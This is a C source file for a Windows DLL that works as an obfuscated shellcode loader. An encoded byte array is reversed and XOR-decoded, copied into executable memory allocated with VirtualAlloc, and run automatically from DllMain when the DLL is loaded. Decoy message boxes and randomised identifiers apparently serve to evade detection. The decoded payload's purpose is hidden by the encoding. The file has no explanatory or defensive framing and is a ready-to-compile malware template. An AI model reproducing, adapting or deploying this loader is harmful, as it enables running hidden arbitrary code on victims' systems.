#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment(lib, "user32.lib")

unsigned char tojyvaxdob[] = "\xb8\x23\xdd\xa6\x6d\xb6\x60\xb9\xcd\xe9\x1d\x40\x71\xb8\x09\x5b\x6a\x2f\x3d\xbe\x53\xaf\xac\x72\x82\x1b\x25\x39\xdd\x01\xc0\x1c\xe9\x69\x21\x18\xdc\x5c\x73\x39\x4e\x7f\x44\x5a\x2e\x94\xfd\x77\x78\xb6\x13\xae\x16\x73\xe3\x13\x2a\xff\x1f\x8c\x35\x11\x24\x57\xd4\x32\x7a\x08\xcc\xd7\x77\x51\xcc\x9c\x8b\x5d\xf7\xda\x7e\x23\xc3\x63\xcf\x4d\xfc\x3f\xa2\xb7\x7e\xe3\xde\x4a\x54\xc2\xb5\x3b\x78\xeb\x25\x00\xb7\xd8\x09\xe6\x6f\xff\x81\x4f\x6a\x09\x77\x60\xe1\x7d\x88\xe9\x18\x39\x37\x81\x0a\xf7\x6c\x40\x6b\x1e\x25\xad\x60\x3a\xe0\xbb\x7a\x6d\xc5\xc6\x00\xa6\xdb\xe3\x11\x32\xb2\x5c\x2e\x59\xfe\xd4\x0a\x29\xef\x84\x3e\xbc\x4b\x20\x45\x3f\x6d\x8d\x05\x6a\x85\x2e\xea\xb6\x74\x27\x32\xf9\xac\x8c\xab\xff\x31\x9f\x94\x89\x41\x68\x03\x37\x9b\x3e\xac\x1b\xd6\x3a\x6a\x89\x14\x92\xe3\x6f\x1a\x4c\x31\x68\xb1\xb7\x66\x54\xce\x38\xa9\x4b\x39\x25\x3b\xe7\x84\x9b\x6f\x1a\x13\xc9\x56\x25\xe1\x0f\x5a\xb6\x6c\x82\xfa\xd7\x84\x8c\x9c\x21\x13\x90\x1d\x39\x26\x79\x56\xfe\x4b\x51\x3e\x1c\x26\xfd\xc3\x00\x37\xf8\x2f\x0c\x0e\xa3\xdd\xe6\x5e\x87\x9a\x34\x13\x0a\x61\xb2\x4d\x03\x3f\x1a\xec\xf6\x26\x3a\x9a\xa2\x8b\x73\xf8\x00\xf6\xcf\xda\xdb\xa1\xa4\x95\x84\xc6\x40\x3d\x78\x62\xb3\x98\xab\x77\xfc\x61\x8c\x3a\x5a\x2e\x57\x19\x52\x15\xea\xa5\x23\x12\x0d\xec\x93\x97\xb7\x79\x6e\xee\xb7\x85\x0d\x62\xd2\x24\x9c\xb9\x21\x7e\x2f\xcf\x86\x64\x58\x4b\xef\xce\xf7\x67\x2b\xf1\x4f\xc7\xe2\x3d\xc6\xc8\x1e\xb3\x27\xdd\x05\x07\x93\xbd"; 
int size = sizeof(tojyvaxdob);

int rev_str(char *str)
{
	int len = strlen(str);

	int i, temp;
	for (i = 0; i < len/2; i++) {
		temp = str[i];
		str[i] = str[len-i-1];
		str[len-i-1] = temp;
	}

	return 0;
}

int dymnelzlns(void) {
	MessageBox(NULL,"Program","is on progess",MB_OK);

	rev_str(tojyvaxdob);
	unsigned char tojyvaxdob2[size];

	int i, len = strlen(tojyvaxdob);
	for (i = 0; i < len-1; i++) 
		tojyvaxdob2[i] = tojyvaxdob[i] ^ tojyvaxdob[i+1];
	tojyvaxdob2[i] = tojyvaxdob[i];
	tojyvaxdob2[++i] = '\0';
	rev_str(tojyvaxdob2);
	
   	void *exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    	memcpy(exec, tojyvaxdob2, size);
    	((void(*)())exec)();

    	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved)
{
   	switch (nReason){
    	case DLL_PROCESS_ATTACH:
        	MessageBox(NULL,"Checkpoint","done",MB_OK);
		dymnelzlns();
        	break;
    	case DLL_PROCESS_DETACH:
        	break;
    	case DLL_THREAD_ATTACH:
        	break;
    	case DLL_THREAD_DETACH:
        	break;
    	}
    	
	return TRUE;
}
